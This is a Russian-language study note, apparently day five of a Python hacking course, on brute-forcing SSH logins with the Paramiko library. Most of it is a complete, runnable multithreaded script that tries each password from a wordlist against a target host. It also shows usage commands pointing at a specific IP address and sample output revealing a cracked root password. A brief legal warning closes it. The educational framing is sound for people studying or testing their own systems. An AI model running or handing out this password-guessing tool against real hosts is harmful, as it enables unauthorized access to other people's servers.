# 📦 День 5 — SSH Brute Force с Paramiko

## 🎯 Что изучил сегодня

- Что такое **Brute Force** атака
- Как работать с **Paramiko** — SSH библиотекой Python
- Как читать **wordlist** (файл с паролями)
- Как использовать **global** переменные между потоками
- Как отключать лишние **логи** библиотек

---

## 🔑 Что такое Brute Force?

Перебор всех возможных паролей из списка пока не найдём правильный.

```
passwords.txt:
root
admin
123456
toor
password

→ пробуем каждый по очереди (параллельно)
→ если connect() не дал ошибку — пароль найден!
```

---

## 🔑 Ключевые концепции

### Paramiko — SSH клиент
```python
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, port=22, username=user, password=password, timeout=3)
```
- `SSHClient()` — создаём SSH клиент
- `AutoAddPolicy()` — автоматически доверяем серверу без вопросов
- `connect()` — пытаемся войти. Если нет ошибки — пароль верный!

### global found — флаг остановки
```python
found = False  # глобальный флаг

def try_password(password):
    global found      # используем глобальную переменную
    if found:         # если пароль уже найден
        return        # выходим — не тратим время
    ...
    found = True      # поднимаем флаг когда нашли
```
Когда один поток находит пароль — все остальные видят `found = True` и останавливаются.

### Чтение wordlist
```python
with open(args.wordlist, 'r') as f:
    passwords = f.read().splitlines()
# результат: ['root', 'admin', '123456', 'toor']
```
`splitlines()` — разбивает текст файла по строкам в список.

### Отключение логов paramiko
```python
import logging
logging.getLogger('paramiko').setLevel(logging.CRITICAL)
```
Paramiko по умолчанию печатает внутренние ошибки. Это отключает лишний шум.

---

## 📝 Полный скрипт

```python
import paramiko, argparse, threading, socket
from concurrent.futures import ThreadPoolExecutor
import logging

logging.getLogger('paramiko').setLevel(logging.CRITICAL)

parser = argparse.ArgumentParser(description='SSH Brute Force')
parser.add_argument('host')
parser.add_argument('--user', default='root')
parser.add_argument('--wordlist', default='passwords.txt')
args = parser.parse_args()

lock = threading.Lock()
found = False

with open(args.wordlist, 'r') as f:
    passwords = f.read().splitlines()

def try_password(password):
    global found
    if found:
        return
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(args.host, port=22, username=args.user,
                      password=password, timeout=3)
        print(f'[+] НАЙДЕН!!! {args.user}: {password}')
        found = True
        client.close()
    except paramiko.AuthenticationException:
        print(f'[-] {password} — НЕВЕРНЫЙ')
    except socket.timeout:
        print(f'[?] {args.host} — ТАЙМАУТ')
    except Exception:
        pass

with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_password, passwords)
```

---

## 🖥️ Использование

```bash
# Базовый запуск
python3 day5.py 45.33.32.156

# С указанием пользователя и wordlist
python3 day5.py 45.33.32.156 --user root --wordlist passwords.txt
```

---

## 📊 Пример вывода

```
[-] password — НЕВЕРНЫЙ
[-] admin — НЕВЕРНЫЙ
[-] toor — НЕВЕРНЫЙ
[-] 123456 — НЕВЕРНЫЙ
[+] НАЙДЕН!!! root: toor
```

---

## ⚠️ Важно

Используй только на системах с **явным разрешением** владельца.
Brute force без разрешения — **незаконно**.

---

## 📈 Прогресс курса

| День | Тема | Статус |
|------|------|--------|
| День 1 | Сокеты, TCP, Banner Grabbing | ✅ |
| День 2 | JSON отчёты | ✅ |
| День 3 | argparse CLI | ✅ |
| День 4 | Threading | ✅ |
| День 5 | SSH Brute Force с Paramiko | ✅ |
